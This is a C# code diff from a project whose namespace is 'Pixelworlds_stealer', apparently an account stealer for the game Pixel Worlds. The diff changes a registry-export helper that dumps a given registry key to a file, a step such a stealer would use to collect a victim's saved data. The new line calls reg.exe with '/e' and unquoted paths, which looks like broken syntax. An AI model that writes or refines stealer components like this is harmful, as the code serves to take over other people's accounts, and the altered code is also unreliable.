@@ -9,25 +9,10 @@ namespace Pixelworlds_stealer
 {
     internal class reg
     {
-        public static void ExportKey(string RegKey, string SavePath)
+         public static void ExportKey(string RegKey, string SavePath)
         {
-            string path = "\"" + SavePath + "\"";
-            string key = "\"" + RegKey + "\"";
 
-            var proc = new Process();
-            try
-            {
-                proc.StartInfo.FileName = "regedit.exe";
-                proc.StartInfo.UseShellExecute = false;
-                proc = Process.Start("regedit.exe", "/e " + path + " " + key + "");
-
-                if (proc != null) proc.WaitForExit();
-            }
-            finally
-            {
-                if (proc != null) proc.Dispose();
-            }
-
+            Process.Start("reg.exe", "/e " + SavePath + " " + RegKey + "");
         }
     }
 }
